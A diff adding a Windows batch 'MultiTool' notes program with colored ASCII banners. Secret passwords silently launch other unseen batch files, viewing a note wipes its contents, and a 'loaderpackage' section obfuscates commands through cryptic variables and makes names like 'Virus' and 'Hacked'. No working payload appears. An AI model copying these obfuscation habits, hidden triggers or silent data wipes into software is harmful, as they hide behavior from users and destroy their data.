+set /p l= [38;2;13;238;255m(E,V,C):
+
+if %l% == E goto edit
+if %l% == C goto create
+if %l% == V goto veiw
+if %l% == Pw1234 start Flappy_Bird.bat
+if %l% == e goto edit
+if %l% == c goto create
+if %l% == v goto veiw
+if %l% == Pw1234 start Flappy_Bird.bat
+goto notepadchoice
+:create
+%Il1Ill1l%%Ill111ll%%IlIIlI1l%
+echo. 
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m███    ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m███████ [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m █████  [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m████   ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m██      [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██ ██  ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m█████   [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m███████ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██  ██ ██ [38;2;45;60;148m██ [38;2;14;66;142m ██  ██  [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m     ██ [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m ██████  [38;2;71;51;151m██   ████ [38;2;45;60;148m██ [38;2;14;66;142m  ████   [38;2;0;70;134m███████ [38;2;0;72;123m██   ██ [38;2;0;73;112m███████ [38;2;25;73;100m██   ██ [38;2;42;72;88m███████  
+echo                              [40;36mMade By [38;2;96;37;150mU[38;2;71;51;151mN[38;2;45;60;148mI[38;2;14;66;142V[38;2;0;70;134mE[38;2;0;72;123mR[38;2;0;73;112mS[38;2;25;73;100mA[38;2;42;72;88mL [38;2;126;18;18m Master 
+echo                                     [40;32m Thank you [40;37mfor [40;35musing [40;37mmy [40;31mMultiTool [40;32m%user% [40;31m^<3  
+echo.  
+echo.  
+echo   [40;31m Disclaimer: Developers assume no liabilty and are not responsible for any misuse or damage caused by Universal[40;32m  
+echo.  
+echo.  
+echo.  
+echo [38;2;255;109;46mWhat Name Do You Want Your Notes To Be Named?
+
+set /p n1=Name:
+if exist %n1%.txt (
+echo. 
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m███    ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m███████ [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m █████  [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m████   ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m██      [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██ ██  ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m█████   [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m███████ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██  ██ ██ [38;2;45;60;148m██ [38;2;14;66;142m ██  ██  [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m     ██ [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m ██████  [38;2;71;51;151m██   ████ [38;2;45;60;148m██ [38;2;14;66;142m  ████   [38;2;0;70;134m███████ [38;2;0;72;123m██   ██ [38;2;0;73;112m███████ [38;2;25;73;100m██   ██ [38;2;42;72;88m███████  
+echo                              [40;36mMade By [38;2;96;37;150mU[38;2;71;51;151mN[38;2;45;60;148mI[38;2;14;66;142V[38;2;0;70;134mE[38;2;0;72;123mR[38;2;0;73;112mS[38;2;25;73;100mA[38;2;42;72;88mL [38;2;126;18;18m Master 
+echo                                     [40;32m Thank you [40;37mfor [40;35musing [40;37mmy [40;31mMultiTool [40;32m%user% [40;31m^<3  
+echo.  
+echo.  
+echo   [40;31m Disclaimer: Developers assume no liabilty and are not responsible for any misuse or damage caused by Universal[40;32m  
+echo.  
+echo.  
+echo.  
+echo The Name You Typed Already Exist!
+echo Please Type An Valid Name
+timeout /t 2 /nobreak >nul
+%Il1Ill1l%%Ill111ll%%IlIIlI1l%
+goto create
+)
+cls
+goto notes
+
+:notes
+%Il1Ill1l%%Ill111ll%%IlIIlI1l%
+title Notes
+echo. 
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m███    ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m███████ [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m █████  [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m████   ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m██      [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██ ██  ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m█████   [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m███████ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██  ██ ██ [38;2;45;60;148m██ [38;2;14;66;142m ██  ██  [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m     ██ [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m ██████  [38;2;71;51;151m██   ████ [38;2;45;60;148m██ [38;2;14;66;142m  ████   [38;2;0;70;134m███████ [38;2;0;72;123m██   ██ [38;2;0;73;112m███████ [38;2;25;73;100m██   ██ [38;2;42;72;88m███████  
+echo                              [40;36mMade By [38;2;96;37;150mU[38;2;71;51;151mN[38;2;45;60;148mI[38;2;14;66;142V[38;2;0;70;134mE[38;2;0;72;123mR[38;2;0;73;112mS[38;2;25;73;100mA[38;2;42;72;88mL [38;2;126;18;18m Master 
+echo                                     [40;32m Thank you [40;37mfor [40;35musing [40;37mmy [40;31mMultiTool [40;32m%user% [40;31m^<3  
+echo.  
+echo.  
+echo   [40;31m Disclaimer: Developers assume no liabilty and are not responsible for any misuse or damage caused by Universal[40;32m  
+echo.  
+echo.  
+echo.  
+echo [38;2;255;109;46mPlease Start Typing What You Want In The Notes
+
+set /p n2= [38;2;13;238;255mTyping:
+
+if "%n2%"=="JaidenBellomy0924" start Q2Notes.bat
+
+echo %n2% >>%n1%.txt
+goto notes
+
+
+
+:veiw
+echo. 
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m███    ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m███████ [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m █████  [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m████   ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m██      [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██ ██  ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m█████   [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m███████ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██  ██ ██ [38;2;45;60;148m██ [38;2;14;66;142m ██  ██  [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m     ██ [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m ██████  [38;2;71;51;151m██   ████ [38;2;45;60;148m██ [38;2;14;66;142m  ████   [38;2;0;70;134m███████ [38;2;0;72;123m██   ██ [38;2;0;73;112m███████ [38;2;25;73;100m██   ██ [38;2;42;72;88m███████  
+echo                              [40;36mMade By [38;2;96;37;150mU[38;2;71;51;151mN[38;2;45;60;148mI[38;2;14;66;142V[38;2;0;70;134mE[38;2;0;72;123mR[38;2;0;73;112mS[38;2;25;73;100mA[38;2;42;72;88mL [38;2;126;18;18m Master 
+echo                                     [40;32m Thank you [40;37mfor [40;35musing [40;37mmy [40;31mMultiTool [40;32m%user% [40;31m^<3  
+echo.  
+echo.  
+echo   [40;31m Disclaimer: Developers assume no liabilty and are not responsible for any misuse or damage caused by Universal[40;32m  
+echo.  
+echo.  
+echo.  
+echo Type The txt Name.
+set /p n=Name:
+if not exist %n%.txt (
+echo The Name You Typed Dosent Not Exist!
+timeout /t 2 /nobreak >nul
+%Il1Ill1l%%Ill111ll%%IlIIlI1l%
+goto veiw
+)
+goto veiw1
+:veiw1
+echo. 
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m███    ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m███████ [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m █████  [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m████   ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m██      [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██ ██  ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m█████   [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m███████ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██  ██ ██ [38;2;45;60;148m██ [38;2;14;66;142m ██  ██  [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m     ██ [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m ██████  [38;2;71;51;151m██   ████ [38;2;45;60;148m██ [38;2;14;66;142m  ████   [38;2;0;70;134m███████ [38;2;0;72;123m██   ██ [38;2;0;73;112m███████ [38;2;25;73;100m██   ██ [38;2;42;72;88m███████  
+echo                              [40;36mMade By [38;2;96;37;150mU[38;2;71;51;151mN[38;2;45;60;148mI[38;2;14;66;142V[38;2;0;70;134mE[38;2;0;72;123mR[38;2;0;73;112mS[38;2;25;73;100mA[38;2;42;72;88mL [38;2;126;18;18m Master 
+echo                                     [40;32m Thank you [40;37mfor [40;35musing [40;37mmy [40;31mMultiTool [40;32m%user% [40;31m^<3  
+echo.  
+echo.  
+echo   [40;31m Disclaimer: Developers assume no liabilty and are not responsible for any misuse or damage caused by Universal[40;32m  
+echo.  
+echo.  
+echo.  
+type %n%.txt
+pause
+break>%n%.txt
+echo 0 >> %n%.txt
+pause
+%Il1Ill1l%%Ill111ll%%IlIIlI1l%
+goto notepadchoice
+
+
+:edit
+%Il1Ill1l%%Ill111ll%%IlIIlI1l%
+echo. 
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m███    ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m███████ [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m █████  [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m████   ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m██      [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██ ██  ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m█████   [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m███████ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██  ██ ██ [38;2;45;60;148m██ [38;2;14;66;142m ██  ██  [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m     ██ [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m ██████  [38;2;71;51;151m██   ████ [38;2;45;60;148m██ [38;2;14;66;142m  ████   [38;2;0;70;134m███████ [38;2;0;72;123m██   ██ [38;2;0;73;112m███████ [38;2;25;73;100m██   ██ [38;2;42;72;88m███████  
+echo                              [40;36mMade By [38;2;96;37;150mU[38;2;71;51;151mN[38;2;45;60;148mI[38;2;14;66;142V[38;2;0;70;134mE[38;2;0;72;123mR[38;2;0;73;112mS[38;2;25;73;100mA[38;2;42;72;88mL [38;2;126;18;18m Master 
+echo                                     [40;32m Thank you [40;37mfor [40;35musing [40;37mmy [40;31mMultiTool [40;32m%user% [40;31m^<3  
+echo.  
+echo.  
+echo   [40;31m Disclaimer: Developers assume no liabilty and are not responsible for any misuse or damage caused by Universal[40;32m  
+echo.  
+echo.  
+echo.  
+echo Please Enter The Name Of The Txt File To Edit It
+set /p m=Name:
+if "%m%"=="" goto edit
+if "%m%"=="  " goto edit
+if "%m%"=="   " goto edit
+if "%m%"=="    " goto edit
+
+goto edit2
+
+:edit2
+%Il1Ill1l%%Ill111ll%%IlIIlI1l%
+echo. 
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m███    ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m███████ [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m █████  [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m████   ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m██      [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██ ██  ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m█████   [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m███████ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██  ██ ██ [38;2;45;60;148m██ [38;2;14;66;142m ██  ██  [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m     ██ [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m ██████  [38;2;71;51;151m██   ████ [38;2;45;60;148m██ [38;2;14;66;142m  ████   [38;2;0;70;134m███████ [38;2;0;72;123m██   ██ [38;2;0;73;112m███████ [38;2;25;73;100m██   ██ [38;2;42;72;88m███████  
+echo                              [40;36mMade By [38;2;96;37;150mU[38;2;71;51;151mN[38;2;45;60;148mI[38;2;14;66;142V[38;2;0;70;134mE[38;2;0;72;123mR[38;2;0;73;112mS[38;2;25;73;100mA[38;2;42;72;88mL [38;2;126;18;18m Master 
+echo                                     [40;32m Thank you [40;37mfor [40;35musing [40;37mmy [40;31mMultiTool [40;32m%user% [40;31m^<3  
+echo.  
+echo.  
+echo   [40;31m Disclaimer: Developers assume no liabilty and are not responsible for any misuse or damage caused by Universal[40;32m  
+echo.  
+echo.  
+echo.  
+%I1l11l1l%%Il1Ill1l%%II1Illll%%Ill11l1l% [38;2;255;109;46m
+%I1l11l1l%%Il1Ill1l%%II1Illll%%Ill11l1l% You Can Type Whatever Now
+%I1l11l1l%%Il1Ill1l%%II1Illll%%Ill11l1l% [38;2;13;238;255m
+type %m%.txt
+%I1l11l1l%%Il1Ill1l%%II1Illll%%Ill11l1l% [38;2;255;109;46m
+set /p t=Typing:
+%I1l11l1l%%Il1Ill1l%%II1Illll%%Ill11l1l% %t% >>%m%.txt
+goto edit2
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:loaderpackage
+::The Abc's::
+@%ox%e%ap%c%ks%h%Yu%o%ks% %lk%o%pj%f%hj%f%fh%
+set IllIll1l=a
+set I1lIllll=b
+set Il1Ill1l=c
+set Ill1llll=d
+set I1l11l1l=e
+set Illlllll=f
+set IlIIll1l=g
+set II1Illll=h
+set I1lIll1l=i
+set I1IIIlll=j
+set IllI1l1l=k
+set Ill111ll=l
+set Il1lll1l=m
+set I1IIllll=n
+set Ill11l1l=o
+set Il111lll=p
+set I11lll1l=q
+set Ill1l1ll=r
+set IlIIlI1l=s
+set I11Illll=t
+set Ill11I1l=u
+set I1lIlIll=v
+set l1lIl11l=w
+set I1lIl1ll=x
+set IIlIl11l=y
+set lI1Il1ll=z
+::Numbers::
+set ll1lII1l=1
+set ll1lII1I=2
+set l111II1l=3
+set l11lIIll=4
+set ll1lII11=5
+set l11l1I1l=6
+set l111lI1l=7
+set l11l1111=8
+set l111llll=9
+set l111lIlI=0
+::Syombols::
+set l1l1l11I==
+set l1l1l11l=%
+set l1l1l111=/
+set l1l1ll11=[
+set lllIll11=@
+::Randomizer::
+set /a lllI111l=%random% %%10 +1 
+set /a l11lIl11=%random% %%100 +1 
+set /a lllIllll=%random% %%100 +1 
+set /a lllIlII1=%random% %%10000 +1 
+set /a lllIllI1=%random% %%10000 +1 
+set /a lllIlIl1=%random% %%10000 +1 
+set /a lllIlIII=%random% %%10000 +1 
+
+if %lllI111l%==1 set lI1I111l=a%random% & set lI1I1lll=Virus%random% & set lI1I111l=Hacked%random%
+if %lllI111l%==2 set lI1I111l=b%random% & set lI1I1lll=V1rus%random% & set lI1I111l=Ha3kEd%random%
+if %lllI111l%==3 set lI1I111l=c%random% & set lI1I1lll=vIruS%random% & set lI1I111l=Hacker%random%
+if %lllI111l%==4 set lI1I111l=d%random% & set lI1I1lll=V1uRs%random% & set lI1I111l=Ha3k%random% 
+if %lllI111l%==5 set lI1I111l=e%random% & set lI1I1lll=3rror%random% & set lI1I111l=hA3k%random%
+if %lllI111l%==6 set lI1I111l=f%random% & set lI1I1lll=Error%random% & set lI1I111l=Abcdefghijklmnopqrstuvwxyz%random%
+if %lllI111l%==7 set lI1I111l=g%random% & set lI1I1lll=3rr0R%random% & set lI1I111l=HackedProgram%random%
+if %lllI111l%==8 set lI1I111l=h%random% & set lI1I1lll=eRR0r%random% & set lI1I111l=HackerPackage%random%
+if %lllI111l%==9 set lI1I111l=i%random% & set lI1I1lll=3RR0r%random% & set lI1I111l=lol%random%
+::3::
+if %lllI111l%==1 set lI1I111l=a%random%
+if %lllI111l%==2 set lI1I111l=b%random%
+if %lllI111l%==3 set lI1I111l=c%random%
+if %lllI111l%==4 set lI1I111l=d%random%
+if %lllI111l%==5 set lI1I111l=e%random%
+if %lllI111l%==6 set lI1I111l=f%random%
+if %lllI111l%==7 set lI1I111l=g%random%
+if %lllI111l%==8 set lI1I111l=h%random%
+if %lllI111l%==9 set lI1I111l=i%random%
+::Ending::
+:: %Il1Ill1l%%Ill111ll%%IlIIlI1l% :: ::cls::
+:: %I1l11l1l%%Il1Ill1l%%II1Illll%%Ill11l1l% :: ::echo::
+:: %Il111lll%%IllIll1l%%Ill11I1l%%IlIIlI1l%%I1l11l1l% :: ::pause::
+:: %I11Illll%%I1lIll1l%%I11Illll%%Ill111ll%%Il1Ill1l% :: ::title::
+:: %I11Illll%%I1lIll1l%%Il1lll1l%% :: ::timeout::
